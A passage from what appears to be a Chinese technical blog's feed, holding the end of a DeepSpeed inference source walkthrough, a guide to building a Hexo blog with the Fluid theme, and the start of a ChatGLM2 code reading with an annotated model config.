class="hljs-string">&quot;lm_head&quot;</span> <span class="hljs-keyword">in</span> all_reduce_linears <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;embed_out&quot;</span> <span class="hljs-keyword">in</span> all_reduce_linears:<br>      <span class="hljs-keyword">return</span> _autotp._replace_last_linear_module(module)<br>  <span class="hljs-keyword">return</span> _autotp._replace_module(module)<br></code></pre></td></tr></table></figure><p>关于 AutoTP 是怎么实现的，这里不再赘述。但我可以简单地描述一下这里的操作。<code>replace_wo_policy</code> 的参数中，<code>module</code> 就是输入的要被替换的网络层的类名，<code>all_reduce_linear</code> 表示输入的 policy。仍以 <code>t5-v1_1-small</code> 为例，<code>module</code> 就是 <code>T5Block</code>，其中的 <code>all_reduce_linear</code> 则是 ‘SelfAttention.o’, ‘EncDecAttention.o’, ‘DenseReluDense.wo’。<code>_autotp.update_linear_policies</code> 中会将 <code>all_reduce_linear</code> 中记录的 <code>nn.linear</code> 层用自己内部的函数做张量切分，并使用 <code>inference_all_reduce</code> 做运算，因此需要被替换为 <code>LinearAllreduce</code> 类（见下）。因为这是一个 all reduce 操作，所以取名为 <code>all_reduce_linear</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> deepspeed <span class="hljs-keyword">import</span> comm <span class="hljs-keyword">as</span> dist<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinearAllreduce</span>(nn.Module):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, weight, bias=<span class="hljs-literal">None</span>, mp_group=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-built_in">super</span>(LinearAllreduce, self).__init__()<br>    self.weight = weight<br>    self.bias = bias<br>    self.mp_group = mp_group<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span></span>):<br>    output = torch.matmul(<span class="hljs-built_in">input</span>, self.weight.transpose(-<span class="hljs-number">1</span>, -<span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">if</span> self.mp_group <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        dist.inference_all_reduce(output, group=self.mp_group)<br>    <span class="hljs-keyword">if</span> self.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        output += self.bias<br>    <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><h4 id="replace-with-policy">replace_with_policy</h4><p>最后，我们来看一下 <code>replace_with_policy</code> 如何实现的。因为这里的网络层替换有对应的 policy 类，所以 deepspeed 会根据对应的 model，构建出相应的 policy 类和包含它的 container 类。在 container 类做好张量初始化和拆分后，准备好数据和 config 信息，再实例化一个内部的高性能 model 类，最后返回：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_with_policy</span>(<span class="hljs-params">child, policy_cls, triangular_masking, inference=<span class="hljs-literal">False</span>, layer_id=<span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment"># 0. 构造与 model 对应的 policy 类</span><br>  policy = policy_cls(child, inference=inference)<br>  <span class="hljs-comment"># ...</span><br>  <span class="hljs-comment"># 1. create model-specific container object using the policy object.</span><br>  _container = policy_to_ds_container(policy=policy,<br>                                      config=config,<br>                                      model_config=model_config,<br>                                      layer_id=layer_id,<br>                                      child=child)<br>  <span class="hljs-comment"># 2. Set the tensor parallelism config</span><br>  _container.set_tensor_parallel_config(config.tensor_parallel.tp_size, config.tensor_parallel.tp_group)<br><br>  <span class="hljs-comment"># 3. Initialize tensors</span><br>  _container.initialize_tensors()<br><br>  <span class="hljs-comment"># 4. deal with data types -- needs refactor to use dtype instead of fp16</span><br>  <span class="hljs-keyword">if</span> config.dtype <span class="hljs-keyword">in</span> [torch.float16, torch.bfloat16, torch.int8]:<br>      _container.convert_to_required_dtype()<br><br>  <span class="hljs-comment"># 5. Set the quantization config</span><br>  quantizer = GroupQuantizer(q_int8=quantize)<br>  _container.set_quantization_config(quantizer)<br><br>  <span class="hljs-comment"># 6. create a DS Inference config object</span><br>  _container.create_ds_model_config()<br><br>  <span class="hljs-comment"># 7. use the config and create the module</span><br>  _container.create_module()<br><br>  <span class="hljs-comment"># 8. transpose the weights and bias if needed</span><br>  _container.transpose()<br><br>  <span class="hljs-comment"># 9. deal with tensor parallelism.</span><br>  _container.apply_tensor_parallelism(mp_replace)<br><br>  <span class="hljs-comment"># 10. copy the tensors from the model-specific container to the new module</span><br>  _container.copy_data_to_new_module()<br><br>  <span class="hljs-comment"># 11. set global for generic checkpoint loading</span><br>  <span class="hljs-keyword">global</span> container_g<br>  <span class="hljs-keyword">if</span> container_g <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>      container_g = _container<br>  <span class="hljs-keyword">return</span> _container.module<br></code></pre></td></tr></table></figure><p>这里以 llama2 模型为例。首先程序会构造与 llama 对应的 <code>LLAMA2LayerPolicy</code> 类和 <code>DS_LLAMA2Container</code> 类。然后，程序开始依顺序准备模型的 TP、量化等 config，再创建内部的 llama 模型 <code>DeepSpeedLlama2Inference</code>，并将张量数据切分后拷贝到新模型中，最后返回。<code>DeepSpeedLlama2Inference</code> 就是 deepspeed 针对 llama2 开发的高性能推理模型。</p><h4 id="generic-injection">generic_injection</h4><p>再顺便看看 <code>generic_injection</code> 怎么处理非 <code>nn.Module</code> 类。<a href="https://github.com/microsoft/DeepSpeed/blob/v0.14.2/deepspeed/module_inject/replace_module.py#L87-L177">从 <code>generic_injection</code> 的源码可以看出</a>，它要替换的注意力块来自于 <a href="https://github.com/huggingface/diffusers">diffusers 库</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> diffusers<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(diffusers.models.attention, <span class="hljs-string">&#x27;CrossAttention&#x27;</span>):<br>  cross_attention = diffusers.models.attention.CrossAttention<br><span class="hljs-keyword">else</span>:<br>  cross_attention = diffusers.models.attention_processor.Attention<br>attention_block = diffusers.models.attention.BasicTransformerBlock<br>new_policies = &#123;<br>  cross_attention: replace_attn,<br>  attention_block: replace_attn_block,<br>&#125;<br></code></pre></td></tr></table></figure><p>使用 deepspeed 自己实现的 <code>DSClipEncoder</code> 替换模型的 <code>text_encoder</code> 部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ..model_implementations.transformers.clip_encoder <span class="hljs-keyword">import</span> DSClipEncoder<br>cg_encoder = DSClipEncoder(module.text_encoder, enable_cuda_graph=enable_cuda_graph)<br><span class="hljs-built_in">setattr</span>(module, <span class="hljs-string">&#x27;text_encoder&#x27;</span>, cg_encoder)<br></code></pre></td></tr></table></figure><p>然后就是遍历模型的所有子模块，并一一检查它们是否与先前定义的 <code>new_policies</code> 中的替换策略匹配：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> module.__dict__.keys():<br>  <span class="hljs-comment"># 遍历，查看是否match</span><br>  sub_module = <span class="hljs-built_in">getattr</span>(module, name)<br>  policy = _module_match(sub_module)<br><br>  <span class="hljs-keyword">if</span> policy <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_replace_module</span>(<span class="hljs-params">module, policy</span>):<br>      <span class="hljs-keyword">for</span> name, child <span class="hljs-keyword">in</span> module.named_children():<br>        _replace_module(child, policy)<br>        <span class="hljs-keyword">if</span> child.__class__ <span class="hljs-keyword">in</span> new_policies:<br>          replaced_module = new_policies[child.__class__](child, policy)<br>          <span class="hljs-built_in">setattr</span>(module, name, replaced_module)<br>    <span class="hljs-comment"># 找到match的module后做替换</span><br>    _replace_module(sub_module, policy)<br>    new_module = policy.apply(sub_module, enable_cuda_graph=enable_cuda_graph)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;**** found and replaced <span class="hljs-subst">&#123;name&#125;</span> w. <span class="hljs-subst">&#123;<span class="hljs-built_in">type</span>(new_module)&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">setattr</span>(module, name, new_module)<br></code></pre></td></tr></table></figure><p>对于每个匹配的子模块，使用 <code>_replace_module</code> 函数递归地替换其子模块。在这里，<code>new_policies</code> 是一个字典，其中键是类（如 <code>CrossAttention</code> 或 <code>BasicTransformerBlock</code>），而值是一个函数：<code>replace_attn</code> 或者 <code>replace_attn_block</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_attn</span>(<span class="hljs-params">child, policy</span>):<br>  policy_attn = policy.attention(child)<br>  <span class="hljs-comment"># ...</span><br>  <span class="hljs-keyword">return</span> attn_module<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_attn_block</span>(<span class="hljs-params">child, policy</span>):<br>  config = Diffusers2DTransformerConfig()<br>  <span class="hljs-keyword">return</span> DeepSpeedDiffusersTransformerBlock(child, config)<br></code></pre></td></tr></table></figure><p>该函数接受原始模块和策略作为参数，并返回替换后的模块。最后，<code>policy</code> 内实现的新模块完成对模型的进一步替换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">new_module = policy.apply(sub_module, enable_cuda_graph=enable_cuda_graph)<br></code></pre></td></tr></table></figure><p>目前 deepspeed 支持的 <code>replace_policy</code> 有很多，具体见其内部实现的 <a href="https://github.com/microsoft/DeepSpeed/blob/v0.14.2/deepspeed/module_inject/replace_policy.py">replace_policy.py 文件</a>，而 <code>generic_policies</code> 适用的有 <code>UNetPolicy</code>, <code>VAEPolicy</code>。它们具体实现有兴趣的读者可自己查阅代码。</p><h1>总结</h1><p>DeepSpeed 作为一款强大的深度学习优化库，为研究人员和开发者提供了高效的训练解决方案。网上许多极客对该框架进行了研究，但并不是很深入，多是翻译搬运，少了自己的理解和对源码的深入挖掘。接下来我还会对 deepspeed 展开详细的研究。</p><p>下一步，我会继续沿着 DeepSpeed 推理的路径出发，研究其推理的高性能的算子融合，包括其专用和通用的 transformer kernel 实现。</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>deepspeed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>将博客切换到 hexo Fluid 主题</title>
    <link href="/2024/04/10/2024-4-10-hello-world/"/>
    <url>/2024/04/10/2024-4-10-hello-world/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.io/">Hexo</a> 是个非常好用且好看的个人博客搭建工具!</p><h2 id="博客切换过程">博客切换过程</h2><h3 id="准备工作">准备工作</h3><ul><li>安装 Git 和 NodeJs</li><li>安装 Hexo（命令为 <code>npm i -g hexo</code>）</li><li>安装插件 <code>npm install hexo-deployer-git --save</code></li></ul><p>随后新建一个空的文件夹：比如新建了文件夹 my_blog，使用 <code>hexo init</code> 命令初始化博客：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> my_blog &amp;&amp; <span class="hljs-built_in">cd</span> my_blog<br>hexo init<br></code></pre></td></tr></table></figure><p>初始化后的文件夹结构如下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br><span class="hljs-string">|   ├── _drafts</span><br><span class="hljs-string">|   └── _posts</span><br>└── themes<br></code></pre></td></tr></table></figure><p>上述文件说明如下：</p><ul><li>_config.yml 网站的配置信息，您可以在此配置大部分的参数。</li><li>package.json：应用程序的信息。EJS, Stylus 和 markdown renderer 已默认安装，您可以自由移除。</li><li>scaffolds：模版文件夹。当您新建文章时，hexo 会根据 scaffold 来建立文件。</li><li>source：资源文件夹是存放用户资源的地方。</li><li>themes：主题文件夹。hexo 会根据主题来生成静态页面。</li></ul><p>另外，如果你还没有专门为自己博客搭建一个仓库的话，需要创建新的 github 仓库，建议命名为 &lt;username.github.io&gt; 的空仓库，然后按照 <a href="https://pages.github.com/">github 官网指导</a> 或者从网上随便找一篇博客来搭建自己的博客网页。</p><h3 id="生成个人博客网站">生成个人博客网站</h3><p>打开 <code>_config.yml</code> 文件，找到 <code># Deployment</code> 的配置信息，并修改如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">git@github.com:&lt;your-github-username&gt;/&lt;github-username.github.io.git&gt;</span> <span class="hljs-comment"># Recommend: ssh-key login</span><br>  <span class="hljs-comment"># repo: https://github.com/&lt;your-github-username&gt;/&lt;github-username.github.io.git&gt; # passwd login</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><p>安装插件 <code>npm install hexo-deployer-git --save</code> 后，运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean<span class="hljs-comment"># 清除数据</span><br>hexo d -g<span class="hljs-comment"># 生成博客</span><br></code></pre></td></tr></table></figure><p>这时候，会看到 hexo 会帮你自动提交至 github repo 的过程，因此第一步创建的空仓库也有了提交内容。至此，在 hexo 的全自动帮助下，博客搭建完毕，访问网址为：<a href="https://github-username.github.io/%E3%80%82">https://github-username.github.io/。</a></p><p>然后，我就把之前 Jekyll 维护的博客 markdown 文档和大量文档内的图片全都移动到了 hexo，过程丝滑，轻松方便。</p><h3 id="博客维护">博客维护</h3><p>hexo 提供了一套维护博客的优雅的办法。笔者在此仅介绍如何新建一篇博客。新建博客格式为 markdown 格式，比如我想创建一篇名为 大模型推理流程介绍 的博客，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new 大模型推理流程介绍<br></code></pre></td></tr></table></figure><p>hexo 会自动帮助你在当前目录下的 <code>source/_posts</code> 下新建名为 <a href="http://xn--xmq16sk9am8vx0hhzeu8njwlink.md">大模型推理流程介绍.md</a>，其中内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">大模型推理流程介绍</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2024-04-10 22:42:19</span><br><span class="hljs-attr">tags:</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>写完博客内容后，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo s<br></code></pre></td></tr></table></figure><p>可在本地查看写的博客网页，若确认没问题，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo d -g<br></code></pre></td></tr></table></figure><p>就会更新博客到网站上。</p><h3 id="主题切换">主题切换</h3><p>hexo 提供的默认主题为 landscape，但太难看。我想使用 Fluid，切换主题的步骤如下：</p><ol><li>通过 npm 直接安装：<code>cd my_blog &amp;&amp; npm install --save hexo-theme-fluid</code></li><li>将 node_modules/hexo-theme-fluid 复制到 themes 文件夹，并重名为fluid：<code>cp -r node_modules/hexo-theme-fluid themes/fluid</code></li><li>在博客目录下创建 <code>_config.fluid.yml</code>，将  <code>themes/fluid/_config.yml</code> 内容复制进去，并将 <code>_config.yml</code> 的主题修改为 <code>theme: fluid</code></li><li>使用 <code>hexo s</code> 进行本地部署，如无问题，则使用命令 <code>hexo d -g</code> 进行远程部署</li></ol><h3 id="附上：hexo-fluid-配置帮助文档">附上：<a href="https://fluid-dev.github.io/hexo-fluid-docs/guide/">hexo fluid 配置帮助文档</a></h3>]]></content>
    
    
    
    <tags>
      
      <tag>Miscellaneous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THUDM/chatglm代码细读</title>
    <link href="/2024/01/27/2024-1-27-huggingface3/"/>
    <url>/2024/01/27/2024-1-27-huggingface3/</url>
    
    <content type="html"><![CDATA[<h1>THUDM/ChatGLM代码细读</h1><h2 id="ChatGLM-是什么">ChatGLM 是什么</h2><p>ChatGLM-6B 是一个基于 General Language Model (GLM) 架构的开源、支持中英双语的对话语言模型。<br>由清华大学研发，截至笔者更新时已经发布了第三代 ChatGLM3。ChatGLM 模型使用了和 ChatGPT 相似的技术，使用约 1T 标识符的中英双语训练，再辅以监督微调、反馈自助、人类反馈强化学习等技术炼成。</p><p>清华大学团队和智谱AI可以说浑身是肝，发布了许多大模型：</p><ul><li><p><a href="https://github.com/thudm/chatglm2-6b">ChatGLM2-6B</a></p><ul><li>更强大的性能：升级了 ChatGLM2-6B 的基座模型。ChatGLM2-6B 使用了 GLM 的混合目标函数，经过了 1.4T 中英标识符的预训练与人类偏好对齐训练，评测结果显示，相比于初代模型，ChatGLM2-6B 在 MMLU（+23%）、CEval（+33%）、GSM8K（+571%） 、BBH（+60%）等数据集上的性能取得了大幅度的提升，在同尺寸开源模型中具有较强的竞争力。</li><li>更长的上下文：使用 FlashAttention 技术将基座模型的上下文长度（Context Length）由 ChatGLM-6B 的 2K 扩展到了 32K，并在对话阶段使用 8K 的上下文长度训练。对于更长的上下文，我们发布了 ChatGLM2-6B-32K 模型。LongBench 的测评结果表明，在等量级的开源模型中，ChatGLM2-6B-32K 有着较为明显的竞争优势。</li><li>更高效的推理：使用 Multi-Query Attention 技术获得了更快的推理速度和更低的显存占用：在官方的模型实现下，推理速度相比初代提升了 42%，INT4 量化下，6G 显存支持的对话长度由 1K 提升到了 8K。</li></ul></li><li><p><a href="https://github.com/THUDM/ChatGLM3">ChatGLM3</a></p><ul><li>更强大的基础模型： ChatGLM3-6B 的基础模型 ChatGLM3-6B-Base 采用了更多样的训练数据、更充分的训练步数和更合理的训练策略。在语义、数学、推理、代码、知识等不同角度的数据集上测评显示，<em>ChatGLM3-6B-Base 具有在 10B 以下的基础模型中最强的性能</em>。</li><li>更完整的功能支持： ChatGLM3-6B 采用了全新设计的 Prompt 格式 ，除正常的多轮对话外。同时原生支持工具调用（Function Call）、代码执行（Code Interpreter）和 Agent 任务等复杂场景。</li><li>更全面的开源序列： 除了对话模型 ChatGLM3-6B 外，还开源了基础模型 ChatGLM3-6B-Base 、长文本对话模型 ChatGLM3-6B-32K。</li></ul></li></ul><p>此外，还有以下模型，我不再详细介绍：</p><ul><li><a href="https://github.com/THUDM/CodeGeeX2">CodeGeeX2</a></li><li><a href="https://github.com/THUDM/WebGLM">WebGLM</a></li><li><a href="https://github.com/THUDM/VisualGLM-6B">VisualGLM-6B</a></li></ul><h2 id="ChatGLM-架构">ChatGLM 架构</h2><p>ChatGLM2 的架构如下图所示。可以看出来，与 llama 等其他基于 transformer 的模型没什么不同：</p><p><img src="/img/LLM/ChatGLM2.png" alt=""></p><h2 id="ChatGLM2-代码详解">ChatGLM2 代码详解</h2><p>因工作原因，先做 ChatGLM2 代码的分析，其模型的 config 数据如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;_name_or_path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;THUDM/chatglm2-6b&quot;</span><span class="hljs-punctuation">,</span><br>  # ....<br>  <span class="hljs-attr">&quot;add_bias_linear&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>                             # 是否在线性层添加偏移项，否<br>  <span class="hljs-attr">&quot;add_qkv_bias&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                                 # 是否添加 qkv 层的偏移项，是<br>  <span class="hljs-attr">&quot;apply_query_key_layer_scaling&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                # 是否对 qkv 层进行缩放，是<br>  <span class="hljs-attr">&quot;apply_residual_connection_post_layernorm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>    # 是否在残差连接后进行层归一化，否<br>  <span class="hljs-attr">&quot;attention_dropout&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.0</span><span class="hljs-punctuation">,</span>                             # attention dropout 值，<span class="hljs-number">0</span><br>  <span class="hljs-attr">&quot;attention_softmax_in_fp32&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                    # 是否在 fp32 下计算 softmax，是<br>  <span class="hljs-attr">&quot;bias_dropout_fusion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                          # 是否融合 bias dropout，是<br>  <span class="hljs-attr">&quot;ffn_hidden_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">13696</span><span class="hljs-punctuation">,</span>                             # ffn 层的隐藏层大小，<span class="hljs-number">13696</span><br>  <span class="hljs-attr">&quot;fp32_residual_connection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>                    # 是否在 fp32 下进行残差连接，否<br>  <span class="hljs-attr">&quot;hidden_dropout&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.0</span><span class="hljs-punctuation">,</span>                                # hidden dropout 值，<span class="hljs-number">0</span><br>  <span class="hljs-attr">&quot;hidden_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4096</span><span class="hljs-punctuation">,</span>                                  # 隐藏层大小，<span class="hljs-number">4096</span><br>  <span class="hljs-attr">&quot;kv_channels&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">128</span><span class="hljs-punctuation">,</span>                                   # kv 张量的通道数，<span class="hljs-number">128</span><br>  <span class="hljs-attr">&quot;layernorm_epsilon&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1e-05</span><span class="hljs-punctuation">,</span>                           # layernorm 层的最小值，<span class="hljs-number">1e-05</span><br>  <span class="hljs-attr">&quot;multi_query_attention&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                        # 是否使用多查询注意力，是<br>  <span class="hljs-attr">&quot;multi_query_group_num&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>                           # 多查询注意力的组数，<span class="hljs-number">2</span><br>  <span class="hljs-attr">&quot;num_attention_heads&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span>                            # 注意力头数，<span class="hljs-number">32</span><br>  <span class="hljs-attr">&quot;num_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">28</span><span class="hljs-punctuation">,</span>                                     # transformer层数，<span class="hljs-number">28</span><br>  <span class="hljs-attr">&quot;original_rope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                                # 是否使用原生 RoPE，是<br>  <span class="hljs-attr">&quot;padded_vocab_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">65024</span><span class="hljs-punctuation">,</span>                           # 填充后的词表大小，<span class="hljs-number">65024</span><br>  <span class="hljs-attr">&quot;post_layer_norm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                              # 是否在 transformer 层后进行层归一化，是<br>  <span class="hljs-attr">&quot;rmsnorm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                                      # 是否使用 RMSNorm，是<br>  <span class="hljs-attr">&quot;seq_length&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32768</span><span class="hljs-punctuation">,</span>                                  # 支持的最长序列长度，<span class="hljs-number">32768</span><br>  <span class="hljs-attr">&quot;use_cache&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                                    # 是否使用 KV cache，是<br>  <span class="hljs-attr">&quot;torch_dtype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;float16&quot;</span><span class="hljs-punctuation">,</span>                             # 模型的精度，float16<br>  <span class="hljs-attr">&quot;transformers_version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;4.27.1&quot;</span><span class="hljs-punctuation">,</span>                     # transformers 版本，<span class="hljs-number">4.27</span><span class="hljs-number">.1</span><br>  <span class="hljs-attr">&quot;tie_word_embeddings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>                         # 是否对词嵌入进行绑定，否<br>  <span class="hljs-attr">&quot;eos_token_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>                                    # 句子结束符 id，<span class="hljs-number">2</span><br>  <span class="hljs-attr">&quot;pad_token_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span>                                     # 填充符 id，<span class="hljs-number">0</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="ChatGLM-基件">ChatGLM 基件</h3><p>与<a 